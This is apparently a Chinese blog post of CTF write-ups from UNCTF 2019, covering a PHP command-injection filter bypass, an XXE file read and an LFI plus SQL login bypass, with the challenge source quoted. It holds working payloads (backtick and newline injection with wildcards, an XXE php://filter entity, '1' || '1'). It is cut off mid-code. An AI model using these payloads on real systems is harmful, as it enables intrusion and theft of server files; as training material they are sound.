
<!DOCTYPE html>
<html lang class="loading">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>2019年11月份 CTF Write Up 集合 - Knlvre</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="
UNCTF、上海 CTF、湖湘杯复赛、成都大学第二届玄武杯、NJUPT CTF

UNCTF时间：2019年10月22日 — 2019年10月27日
因为 Write Up 和 复现环境出现得比较,"> 
    <meta name="author" content="Knlvre"> 
    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
    <link rel="icon" href="knlvre.github.io/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
    <link rel="stylesheet" href="knlvre.github.io/css/obsidian.css">
    <link rel="stylesheet" href="knlvre.github.io/css/ball-atom.min.css">
</head>
</html>

<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">Knlvre</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">2019年11月份 CTF Write Up 集合</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg);">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
                
                November 01, 2019
            </p>
            <h3 class="post-title animated fadeInDown"><a href="knlvre.github.io/2019/11/01/2019年11月份 CTF Write Up 集合/" title="2019年11月份 CTF Write Up 集合">2019年11月份 CTF Write Up 集合</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    207k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    3:08
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="knlvre.github.io/tags/CTF比赛/">CTF比赛</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <blockquote>
<p>UNCTF、上海 CTF、湖湘杯复赛、成都大学第二届玄武杯、NJUPT CTF</p>
</blockquote>
<h1 id="UNCTF"><a href="#UNCTF" class="headerlink" title="UNCTF"></a>UNCTF</h1><p>时间：2019年10月22日 — 2019年10月27日</p>
<p>因为 Write Up 和 复现环境出现得比较晚，所以放到 11 月写</p>
<p>记录</p>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><blockquote>
<p>考点：RCE（命令执行），PHP正则匹配反斜杠的特点，文件通配符，Linux 命令换行，Linux 命令终止符</p>
</blockquote>
<p>开始做题前先清楚几个知识点：</p>
<p><strong>① PHP正则匹配反斜杠的特点</strong></p>
<p>在本题的<code>preg_match()</code>函数中，我们可以发现对<code>反斜杠（\）</code>的过滤使用的是<code>\\</code>，但是这样写是不对的，正确写法是<code>三个反斜杠（\\\）</code>。在 PHP 正则中，三个反斜杠才能匹配到真正意义上的一个<code>字符反斜杠</code></p>
<p>因为在 PHP 代码中，PHP解释器本身会对反斜杠进行一次解释，而 正则函数 本身也会对反斜杠进行解释。并且，如果反斜杠后面的字符不需要转义，即反斜杠没有起转义作用时，它就会被当成普通字符串保留下来</p>
<p>两个反斜杠</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat index.php </span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[a];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\\/"</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"NO"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Yes"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># curl 'http://127.0.0.1?a=\';</span></span><br><span class="line">Yes</span><br></pre></td></tr></table></figure>
<p>PHP解释器完成第一次反斜杠解释，变为：<code>preg_match(&quot;/\/&quot;,$a)</code>，正则完成第二次反斜杠解释，变为：<code>preg_match(&quot;//&quot;,$a)</code></p>
<p>Ps：等于说第二次解释反斜杠（正则完成的）的时候，反斜杠作用的目标是<code>斜杠（/）</code>，但是这没有意义，因为<code>“/”</code>本身就是没有其他作用的字符。preg_match中的第一个参数需要有一对任何非字母、数字、“\”或空格的字符作为分隔符，也就是我们最常用的“/” </p>
<p>三个反斜杠</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat index.php </span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[a];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\\\/"</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"NO"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Yes"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># curl 'http://127.0.0.1?a=\';</span></span><br><span class="line">NO</span><br></pre></td></tr></table></figure>
<p>PHP解释器完成第一次反斜杠解释，三个反斜杠中，第一个反斜杠解释第二个反斜杠，第三个反斜杠解释结尾的“/”，但是因为没有实际作用，所以它被保留下来，变为：<code>preg_match(&quot;/\\/&quot;,$a)</code>，即原本第二个和第三个反斜杠被保留了</p>
<p>正则完成第二次反斜杠解释，变为：<code>preg_match(&quot;/\/&quot;,$a)</code>，就刚好匹配反斜杠字符</p>
<p><strong>② 文件通配符</strong></p>
<p>Linux 的命令行中，是允许使用通配符的（<code>?</code>和<code>*</code>）</p>
<p>生成 3 个测试文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># ls</span></span><br><span class="line">abc.txt  ab.txt  a.txt</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat a.txt </span></span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat ab.txt </span></span><br><span class="line">ab</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat abc.txt </span></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
<p><code>“*”</code>的使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat a*.txt</span></span><br><span class="line">abc</span><br><span class="line">ab</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<p><code>“?”</code>的使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat ?.txt</span></span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat a?.txt</span></span><br><span class="line">ab</span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat ??.txt</span></span><br><span class="line">ab</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat a??.txt</span></span><br><span class="line">abc</span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># cat ???.txt</span></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
<p>以上是对文件的匹配，但是当想要匹配的是命令时，则需要加上命令的<code>二进制文件</code>的位置，不然只会提示<code>command not found</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># ca? a.txt</span></span><br><span class="line">bash: ca?: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># /bin/ca? abc.txt</span></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
<p>还有一个骚操作可以代替通配符，就是<code>中括号</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># /bin/[b-d]at abc.txt </span></span><br><span class="line">abc</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># /bin/[a-z]at abc.txt </span></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
<p><strong>③ Linux 命令换行</strong></p>
<p>在命令执行的过程中，在URL编码中<code>%0a</code>解释为换行符，而我们可以利用它们来执行多条命令（类似 &amp; 的作用）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/var/www/html# cat index.php </span><br><span class="line">&lt;?php</span><br><span class="line">echo system($_GET[a]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到分别执行了我们给的2个命令，并且都返回了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-1.png" alt="1-1"></p>
<p><strong>④ Linux 命令终止符</strong></p>
<p><code>空格+#（URL编码为%20%23）</code>在 Linux 命令行中为命令的终止符，类似注释符，我们可以利用这个闭合掉源码中的其他东西</p>
<p>OK</p>
<p>出题者对本题做过一次修改：未修改前的非预期解 以及 修改后的预期解，我们这里都看一下：</p>
<p>① 未修改前</p>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">    $b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"> <span class="comment">// try bypass it</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))</span><br><span class="line">        $a = <span class="string">""</span>;</span><br><span class="line">    $a =<span class="string">'"'</span> . $a . <span class="string">'"'</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $b))</span><br><span class="line">        $b = <span class="string">""</span>;</span><br><span class="line">     $b = <span class="string">'"'</span> . $b . <span class="string">'"'</span>;</span><br><span class="line">     $cmd = <span class="string">"file $a $b"</span>;</span><br><span class="line">     str_replace(<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"$cmd"</span>); </span><br><span class="line">     system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对<code>$a</code>的<code>$b</code>的正则中，反斜杠的匹配都出了问题。而对 $a 的正则中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\\|\`</span><br></pre></td></tr></table></figure>
<p>PHP解释器先进行一次解释，变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\|`</span><br></pre></td></tr></table></figure>
<p>然后正则再解释一次，变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|`</span><br></pre></td></tr></table></figure>
<p>所以会导致实际匹配到的字符串为 <strong>“|`”</strong>。这时候反引号就逃逸出来了，可以直接强制地命令执行（尽管还有拼接到 file 命令后面）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a=`uname`</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-2.png" alt="1-2"></p>
<p>发现可以命令执行后，查看当前目录（因为<code>ls</code>命令被禁用，这里用<code>dir</code>）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a=`dir .`</span><br><span class="line"></span><br><span class="line">?a=`dir ../../../`</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-3.png" alt="1-3"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-4.png" alt="1-4"></p>
<p>但是都没有，所以直接用 find 命令找，但是也没有结果</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-5.png" alt="1-5"></p>
<p>这题正确姿势是用<code>grep -R</code>来找，通过文件内容找 flag</p>
<blockquote>
<p>grep -R 参数可以从某个目录开始，递归地查找文件内容</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10026/?a=`/bi?/gre? -R ctf`</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-6.png" alt="1-6"></p>
<p>② 修改后</p>
<p>出题人将<code>\\</code>换到了<code>\*</code>前面，其他没变</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|,|;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $b))</span><br></pre></td></tr></table></figure>
<p>这个时候反引号就无法利用了。因为这里导致<code>\n（换行符）</code>逃逸，所以这里利用它，看着 payload 学习：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a=\&amp;b=%0a/bi?/gre? -R ctf #</span><br></pre></td></tr></table></figure>
<p>实际执行的语句就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file &quot;\&quot; &quot;</span><br><span class="line">/bi?/gre? -R ctf #&quot;</span><br></pre></td></tr></table></figure>
<p><code>a=\</code>是因为这个传入的反斜杠转义掉第二个<code>双引号</code>，才能是下面的 grep 命令正常执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:/var/www/html# file &quot;&quot;&quot;</span><br><span class="line">&gt; ^C</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html# file &quot;\&quot;&quot;</span><br><span class="line">&quot;: cannot open `&quot;&apos; (No such file or directory)</span><br></pre></td></tr></table></figure>
<p>而<code>b</code>的 空格+# 是为了注释掉最后面的双引号</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/1-7.png" alt="1-7"></p>
<h2 id="Do-you-like-xml"><a href="#Do-you-like-xml" class="headerlink" title="Do you like xml?"></a>Do you like xml?</h2><blockquote>
<p>考点：XXE</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/2-1.png" alt="2-1"></p>
<p>看到<code>flag in this pic</code>，下载图片，<code>winhex</code>打开在中间发现<code>flag in flag.php</code>的字样</p>
<p>抓包提交用户名和密码，发现可能有XXE</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/2-2.png" alt="2-2"></p>
<p>测试 payload </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE whatever[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/2-3.png" alt="2-3"></p>
<p>解码就是 flag</p>
<h2 id="K-amp-K战队的老家"><a href="#K-amp-K战队的老家" class="headerlink" title="K&amp;K战队的老家"></a>K&amp;K战队的老家</h2><blockquote>
<p>考点：LFI、万能密码</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-1.png" alt="3-1"></p>
<p>密码爆破无结果，万能密码登陆成功（用浏览器输入会出错，burpsuit输入就可以）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos; || &apos;1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-2.png" alt="3-2"></p>
<p>点击 俱乐部运维手册 会提示<code>Identity problems, please relogin</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-3.png" alt="3-3"></p>
<p>添加<code>x-forwarded-for:127.0.0.1</code>没用，应该要 cookie 了。尝试 URL 中的参数<code>m</code>，LFI payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?m=php://filter/read=convert.base64-encode/resource=home.php</span><br></pre></td></tr></table></figure>
<p>但是这里提示<code>Illegal</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-4.png" alt="3-4"></p>
<p>这说明这里还是有做过滤的，应该是有利用价值。过滤了<code>php</code>、<code>base64</code>，用大小写成功绕过</p>
<p>这里直接写<code>home</code>而不是<code>home.php</code>是因为之前的<code>?m=index</code>和<code>?m=debug</code>也都没有加后缀，猜测可能后台会加上去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?m=php://filter/read=convert.base64-encode/resource=home</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/3-5.png" alt="3-5"></p>
<p>解码之后拿到<code>home.php</code>的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"./inc/config.php"</span>;</span><br><span class="line">$mothed = $_GET[<span class="string">"m"</span>] ? $_GET[<span class="string">"m"</span>] : <span class="string">"index"</span>;</span><br><span class="line">$cookie = $_COOKIE[<span class="string">"identy"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($mothed == <span class="string">"login"</span>) &#123;</span><br><span class="line">	</span><br><span class="line">	$username = $_POST[<span class="string">"user"</span>];</span><br><span class="line">	$userpass = $_POST[<span class="string">"pw"</span>];</span><br><span class="line">	<span class="keyword">if</span>($username == <span class="string">""</span> || $userpass == <span class="string">""</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Account or password cannot be empty");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	waf($username);</span><br><span class="line">	waf($userpass);</span><br><span class="line">	$db-&gt;user_check($username, $userpass, $session);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>($mothed == <span class="string">"index"</span>) &#123;</span><br><span class="line">	check($cookie, $db, $session);</span><br><span class="line">	echo_index();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>($mothed == <span class="string">"logout"</span>) &#123;</span><br><span class="line">	check($cookie, $db, $session);</span><br><span class="line">	setcookie(<span class="string">"identy"</span>,<span class="string">""</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Goodbye");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	mothed_waf($mothed);</span><br><span class="line">	$page = $mothed . <span class="string">".php"</span>;</span><br><span class="line">	<span class="keyword">include</span>($page);</span><br><span class="line">	check($cookie, $db, $session);</span><br><span class="line">	$d = <span class="keyword">new</span> debug($session, $d);</span><br><span class="line">	$d-&gt;vt($session, $d);</span><br><span class="line">	$d-&gt;debug($session);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>前面 include 了 <code>./inc/config.php</code>，修改 payload 拿源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?m=Php://filter/convert.Base64-encode/resource=./inc/config.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"session.php"</span>;</span><br><span class="line"><span class="comment">//include "access.php";</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"func.php"</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"db.php"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> db();</span><br><span class="line">$session = <span class="keyword">new</span> session();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>同样方法拿<code>session.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $choose = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">public</span> $id = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">public</span> $username = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>func.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/(and|or|if|select|union|sleep|order|group|by|exp|user|from|where|tables|substr|database|join|greatest|like|not|hex|bin|ascii|md5|benchmark|concat|mid|strcmp|left|right|replace|when|\/|=|&gt;|&lt;|\*|\(|\)|~|%|!|&amp;&amp;|,|"|;|#|\^|-)/i'</span>, $str) == <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Illegal");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mothed_waf</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/(base64|php|write)/'</span>, $str) == <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Illegal");window.location.href="./home.php?m=index";&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/(flag|access)/i'</span>, $str) == <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Illegal");window.location.href="./home.php?m=index";&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_decode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	$data = urldecode($str);</span><br><span class="line">	$data = substr($data, <span class="number">1</span>);</span><br><span class="line">	$arr = explode(<span class="string">'&amp;'</span>, $data);</span><br><span class="line">	$cipher = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">		$num = hexdec($value);</span><br><span class="line">		$num = $num - <span class="number">240</span>;</span><br><span class="line">		$cipher = $cipher.<span class="string">'%'</span>.dechex($num);</span><br><span class="line">	&#125;</span><br><span class="line">	$key = urldecode($cipher);</span><br><span class="line">	$key = base64_decode($key);</span><br><span class="line">	<span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	$key = base64_encode($str);</span><br><span class="line">	$key = bin2hex($key);</span><br><span class="line">	$arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">	$cipher = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">		$num = hexdec($value);</span><br><span class="line">		$num = $num + <span class="number">240</span>;</span><br><span class="line">		$cipher = $cipher.<span class="string">'&amp;'</span>.dechex($num);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str, $db, &amp;$session)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($str == <span class="string">""</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Please login again");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$objstr = cookie_decode($str);</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		$session = unserialize($objstr);</span><br><span class="line">		$session-&gt;id = intval($session-&gt;id);</span><br><span class="line">		waf($session-&gt;username);</span><br><span class="line">		</span><br><span class="line">	&#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Identity problems, please relogin");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$db-&gt;index_check($session-&gt;id, $session-&gt;username);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check1</span><span class="params">($obj)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($obj-&gt;username !== <span class="string">"debuger"</span>) &#123;</span><br><span class="line">		setcookie(<span class="string">"identy"</span>, <span class="string">""</span>);</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Identity problems, please relogin");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echo_index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> base64_decode(<span 